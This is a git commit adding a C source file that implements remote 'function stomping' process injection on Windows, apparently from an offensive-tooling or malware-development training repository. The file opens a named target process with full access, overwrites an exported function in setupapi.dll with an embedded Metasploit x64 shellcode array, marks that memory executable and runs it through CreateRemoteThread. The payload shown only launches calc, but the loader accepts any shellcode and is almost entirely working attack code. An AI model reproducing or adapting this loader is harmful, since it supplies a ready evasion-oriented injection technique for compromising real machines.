6602c5ff8db4d47f88fa6449d1866f1b071f99aa
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2023-10-12 09:06:00 +0800

    Create DefaultSample_LoadLibrary.c

---
+++ midtier/Function_Stomping_Injection/Remote/DefaultSample_LoadLibrary.c
@@ -0,0 +1,208 @@
+/*
+	function stomping LoadLibrary and GetProcAddress
+*/
+
+#include <Windows.h>
+#include <stdio.h>
+#include <Tlhelp32.h>
+
+
+#define		SACRIFICIAL_DLL			"setupapi.dll"
+#define		SACRIFICIAL_FUNC		"SetupScanFileQueueA"
+
+// x64 calc metasploit shellcode 
+unsigned char Payload[] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+
+
+BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+
+	HANDLE			hSnapShot = NULL;
+	PROCESSENTRY32	Proc = {
+					.dwSize = sizeof(PROCESSENTRY32)
+	};
+
+	// Takes a snapshot of the currently running processes 
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	// Retrieves information about the first process encountered in the snapshot.
+	if (!Process32First(hSnapShot, &Proc)) {
+		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	do {
+
+		WCHAR LowerName[MAX_PATH * 2];
+
+		if (Proc.szExeFile) {
+
+			DWORD	dwSize = lstrlenW(Proc.szExeFile);
+			DWORD   i = 0;
+
+			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
+
+			// converting each charachter in Proc.szExeFile to a lower case character and saving it
+			// in LowerName to do the *wcscmp* call later ...
+
+			if (dwSize < MAX_PATH * 2) {
+
+				for (; i < dwSize; i++)
+					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
+
+				LowerName[i++] = '\0';
+			}
+		}
+
+		// compare the enumerated process path with what is passed, if equal ..
+		if (wcscmp(LowerName, szProcessName) == 0) {
+			// we save the process id 
+			*dwProcessId = Proc.th32ProcessID;
+			// we open a process handle and return
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			if (*hProcess == NULL)
+				printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
+
+			break;
+		}
+
+		// Retrieves information about the next process recorded the snapshot.
+	} while (Process32Next(hSnapShot, &Proc));
+	// while we can still have a valid output ftom Process32Net, continue looping
+
+
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessId == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+}
+
+
+
+
+
+
+BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
+
+	DWORD	dwOldProtection			= NULL;
+	SIZE_T	sNumberOfBytesWritten	= NULL;
+
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten){
+		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
+		return FALSE;
+	}
+
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
+/*
+		!!!! THE TARGET PROCESS MUST HAVE "SACRIFICIAL_DLL" LOADED !!!! 
+*/
+
+
+int wmain(int argc, wchar_t* argv[]) {
+
+	HANDLE		hProcess		= NULL,
+				hThread			= NULL;
+	PVOID		pAddress		= NULL;
+	DWORD		dwProcessId		= NULL;
+
+	HMODULE		hModule			= NULL;
+
+	if (argc < 2) {
+		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
+		return -1;
+	}
+
+	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
+	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
+		printf("[!] Process is Not Found \n");
+		return -1;
+	}
+	printf("[+] DONE \n");
+	printf("[i] Found Target Process Pid: %d \n", dwProcessId);
+
+	
+
+	printf("[i] Loading \"%s\"... ", SACRIFICIAL_DLL);
+	hModule = LoadLibraryA(SACRIFICIAL_DLL);
+	if (hModule == NULL) {
+		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
+	printf("[+] DONE \n");
+
+
+	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
+	if (pAddress == NULL) {
+		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
+	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);
+
+
+	printf("[#] Press <Enter> To Write Payload ... ");
+	getchar();
+	printf("[i] Writing ... ");
+	if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
+		return -1;
+	}
+	printf("[+] DONE \n");
+
+	
+
+	printf("[#] Press <Enter> To Run The Payload ... ");
+	getchar();
+
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+	if (hThread != NULL)
+		WaitForSingleObject(hThread, INFINITE);
+
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+
+	return 0;
+}
+
